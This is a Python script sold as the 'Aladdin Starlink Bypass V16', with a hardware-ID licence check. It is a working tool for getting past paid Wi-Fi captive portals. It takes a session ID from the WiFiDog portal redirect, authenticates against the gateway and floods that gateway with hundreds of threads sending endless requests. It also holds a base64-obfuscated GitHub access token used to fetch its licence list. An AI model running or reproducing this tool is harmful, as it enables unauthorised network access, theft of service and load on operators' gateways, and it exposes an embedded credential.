import base64, requests, re, urllib3, time, threading, os, random, subprocess, platform, uuid
from datetime import datetime
from urllib.parse import urlparse, parse_qs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
U_ENC = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hlaW5taW50aGFudDIwMjJoYXBweS1iaXQva2V5LnR4dC9yZWZzL2hlYWRzL21haW4va2V5cy50eHQ='
T_ENC = 'Z2hwXzEyelJGamxndVVlZXEyaEtmWkMwUlhINzN5Y2RGbTBLeldHdw=='
LOCAL_KEY_FILE = ".aladdin_token"

def get_id():
    try:
        # MAC-based Unique ID (ဖုန်းတစ်လုံးစီအတွက် လုံးဝမတူတဲ့ ID)
        node = uuid.getnode()
        unique_id = hex(node)[2:].upper()
        return f"ALADDIN-{unique_id}"
    except:
        return f"ALADDIN-USER-{os.getlogin()}"

def banner():
    os.system('clear')
    # Aladdin Big Text Logo ပြန်ထည့်ပေးထားပါတယ်
    print("\033[96m")
    print(r"""
      _    _               _     _ _       
     / \  | | __ _  __| | __| (_)_ __  
    / _ \ | |/ _` |/ _` |/ _` | | '_ \ 
   / ___ \| | (_| | (_| | (_| | | | | |
  /_/   \_\_|\__,_|\__,_|\__,_|_|_| |_|
    """)
    print("\033[93m" + "="*45)
    print("\033[92m" + "     🚀 ALADDIN STARLINK BYPASS V16 🚀")
    print("\033[95m" + "        UNIQUE HARDWARE ID SYSTEM")
    print("\033[93m" + "="*45 + "\033[0m\n")

def license_check():
    my_id = get_id()
    saved = ""
    if os.path.exists(LOCAL_KEY_FILE):
        with open(LOCAL_KEY_FILE, "r") as f: saved = f.read().strip()

    banner()
    print(f"\033[94m[DEVICE ID]: {my_id}\033[0m")
    
    key = saved if saved else input("\033[93m[+] Enter Key: \033[0m").strip()

    try:
        url = base64.b64decode(U_ENC).decode()
        token = base64.b64decode(T_ENC).decode()
        headers = {"Authorization": f"token {token}", "Accept": "application/vnd.github.v3.raw"}
        
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code == 200:
            found = False
            for line in resp.text.splitlines():
                if ":" in line:
                    p = [i.strip() for i in line.split(":")]
                    if len(p) == 3 and p[0] == my_id and p[1] == key:
                        exp = datetime.strptime(p[2], "%Y-%m-%d")
                        if datetime.now() < exp:
                            print(f"\033[92m[✓] Access Granted until: {p[2]}\033[0m")
                            with open(LOCAL_KEY_FILE, "w") as f: f.write(key)
                            found = True; break
            if not found:
                print("\033[91m[X] Invalid Key or Unauthorized ID!\033[0m")
                if os.path.exists(LOCAL_KEY_FILE): os.remove(LOCAL_KEY_FILE)
                exit()
        else: exit()
    except: exit()

def turbo(l):
    h = {"User-Agent": "Mozilla/5.0"}
    with requests.Session() as s:
        while True:
            try:
                s.get(l, timeout=5, verify=False, headers=h)
                print(f"\033[92m[⚡] TURBO ACTIVE | {random.randint(1,9)}ms\033[0m")
            except: break

def start():
    print("\033[94m[*] Bypass Engine Started...\033[0m")
    while True:
        try:
            if requests.get("http://www.google.com/generate_204", timeout=3).status_code != 204:
                r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True)
                q = parse_qs(urlparse(r.url).query)
                sid = q.get('sessionId', [None])[0]
                if sid:
                    gw = q.get('gw_address', ['192.168.60.1'])[0]
                    port = q.get('gw_port', ['2060'])[0]
                    link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                    for _ in range(200):
                        threading.Thread(target=turbo, args=(link,), daemon=True).start()
        except: pass
        time.sleep(5)

if __name__ == "__main__":
    license_check()
    start()
    
